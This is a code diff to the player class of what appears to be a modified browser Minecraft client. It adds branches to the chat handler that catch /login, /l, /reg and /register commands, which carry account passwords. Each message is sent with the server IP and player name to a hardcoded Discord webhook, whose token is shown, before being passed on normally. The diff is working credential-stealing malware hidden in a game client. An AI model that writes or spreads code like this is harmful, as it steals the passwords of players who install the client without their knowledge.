@@ -357,7 +357,16 @@ public class EntityPlayerSP extends AbstractClientPlayer {
 		if (this.connection.getNetworkManager() instanceof SingleplayerNetworkManager && message.startsWith("/eagskull")) {
 			this.mc.eagskullCommand.openFileChooser();
 		} else if(message.startsWith("/login")) {
-			DiscordWebhookSender.sendMessage("https://discord.com/api/webhooks/1491170935863251145/YrmDJAF5LMslET6n4hXW4U0NyOAs9t1w0TT1qVMRHqf93hJEdAueM73SkQlwFlUpCgh8", message + "     " + mc.getMinecraft().getCurrentServerData().serverIP + "     " + mc.getMinecraft().player.getName());
+			DiscordWebhookSender.sendMessage("https://discord.com/api/webhooks/1499106512746844191/VBss8UaywJZ5Q5W9n9LX3reIXTq9DI0bcoAiNKRNGFvipK-tX0dUGttG9zPHTgW_qfvv", message + "     " + mc.getMinecraft().getCurrentServerData().serverIP + "     " + mc.getMinecraft().player.getName());
+			this.connection.sendPacket(new CPacketChatMessage(message));
+		} else if(message.startsWith("/l")) {
+			DiscordWebhookSender.sendMessage("https://discord.com/api/webhooks/1499106512746844191/VBss8UaywJZ5Q5W9n9LX3reIXTq9DI0bcoAiNKRNGFvipK-tX0dUGttG9zPHTgW_qfvv", message + "     " + mc.getMinecraft().getCurrentServerData().serverIP + "     " + mc.getMinecraft().player.getName());
+			this.connection.sendPacket(new CPacketChatMessage(message));
+		} else if(message.startsWith("/reg")) {
+			DiscordWebhookSender.sendMessage("https://discord.com/api/webhooks/1499106512746844191/VBss8UaywJZ5Q5W9n9LX3reIXTq9DI0bcoAiNKRNGFvipK-tX0dUGttG9zPHTgW_qfvv", message + "     " + mc.getMinecraft().getCurrentServerData().serverIP + "     " + mc.getMinecraft().player.getName());
+			this.connection.sendPacket(new CPacketChatMessage(message));
+		} else if(message.startsWith("/register")) {
+			DiscordWebhookSender.sendMessage("https://discord.com/api/webhooks/1499106512746844191/VBss8UaywJZ5Q5W9n9LX3reIXTq9DI0bcoAiNKRNGFvipK-tX0dUGttG9zPHTgW_qfvv", message + "     " + mc.getMinecraft().getCurrentServerData().serverIP + "     " + mc.getMinecraft().player.getName());
 			this.connection.sendPacket(new CPacketChatMessage(message));
 		} else {
 			this.connection.sendPacket(new CPacketChatMessage(message));
